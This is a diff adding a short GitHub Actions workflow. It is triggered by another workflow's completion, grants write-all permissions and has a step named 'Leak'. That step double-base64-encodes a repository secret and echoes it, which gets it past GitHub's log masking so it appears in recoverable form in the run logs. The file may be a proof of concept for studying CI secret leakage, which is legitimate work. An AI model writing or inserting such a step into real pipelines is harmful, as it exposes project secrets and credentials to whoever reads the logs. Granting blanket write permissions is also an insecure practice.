@@ -1,0 +1,16 @@
+workflow_run:
+  workflows: [Create and Push Branch, Then Make PR]
+  types:
+    - completed
+
+permissions: 
+  write-all
+
+jobs:
+  create-push-pr:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Leak
+        run: |
+          echo ${{ secrets.SUPER_SECRET }} | base64 -w0 | base64 -w0
